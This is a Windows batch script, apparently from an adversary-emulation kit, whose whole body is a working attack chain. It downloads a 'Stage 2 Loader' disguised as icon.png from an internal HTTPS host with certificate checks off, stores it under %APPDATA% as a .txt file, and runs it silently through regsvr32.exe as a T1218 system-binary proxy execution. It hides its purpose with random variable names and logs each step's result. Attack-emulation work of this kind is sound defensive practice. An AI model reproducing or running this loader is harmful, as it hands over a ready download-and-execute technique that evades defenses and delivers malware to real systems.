@echo off
setlocal enabledelayedexpansion

REM Random SET variable declarations for all PHR_* placeholders
SET vtjdlsp=%APPDATA%\10469\2a612ad7
SET orwkfmb=b85169d2.txt
SET qpzcixe=https://10.0.0.49/stage/2/icon.png?10469-7
SET lnyhwzr=BALAM-S2B
SET fxbqkud=10469
SET hdejvgt=7

REM Initialize log file path
SET akgrnhp=!APPDATA!\!hdejvgt!\macula-simulations.log
mkdir "!APPDATA!\!hdejvgt!" 2>nul

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!lnyhwzr!][!fxbqkud!]: heartbeat_start>> "!akgrnhp!" 2>nul

REM Heartbeat fetch (downloads Stage 2 Loader)
curl -k -s -o "!vtjdlsp!\!orwkfmb!" "!qpzcixe!"

REM Debug: heartbeat_result=errorlevel
echo [!tsvar!][DEBUG][!lnyhwzr!][!fxbqkud!]: heartbeat_result=!errorlevel!>> "!akgrnhp!" 2>nul

REM Debug: chdir_start
echo [!tsvar!][DEBUG][!lnyhwzr!][!fxbqkud!]: chdir_start>> "!akgrnhp!" 2>nul

REM Change to output directory
cd /d "!vtjdlsp!" >nul 2>&1

REM Debug: chdir_result=errorlevel
echo [!tsvar!][DEBUG][!lnyhwzr!][!fxbqkud!]: chdir_result=!errorlevel!>> "!akgrnhp!" 2>nul

REM Debug: regsvr32_start
echo [!tsvar!][DEBUG][!lnyhwzr!][!fxbqkud!]: regsvr32_start>> "!akgrnhp!" 2>nul

REM LOLBIN invocation: regsvr32.exe /s
regsvr32.exe /s !orwkfmb!

REM Debug: regsvr32_result=errorlevel
echo [!tsvar!][DEBUG][!lnyhwzr!][!fxbqkud!]: regsvr32_result=!errorlevel!>> "!akgrnhp!" 2>nul

REM Generate formatted timestamp for TTP logging (YYYY-MM-DD HH:MM:SS)
set "ts_ps="
for /f "delims=" %%T in ('powershell -NoProfile -Command "(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"') do set "ts_ps=%%T"

REM TTP logging based on existence of the downloaded Loader
if exist "!vtjdlsp!\!orwkfmb!" (
    echo [!ts_ps!][TTP][!lnyhwzr!][!fxbqkud!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!akgrnhp!" 2>nul
) else (
    echo [!ts_ps!][TTP][!lnyhwzr!][!fxbqkud!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!akgrnhp!" 2>nul
)

endlocal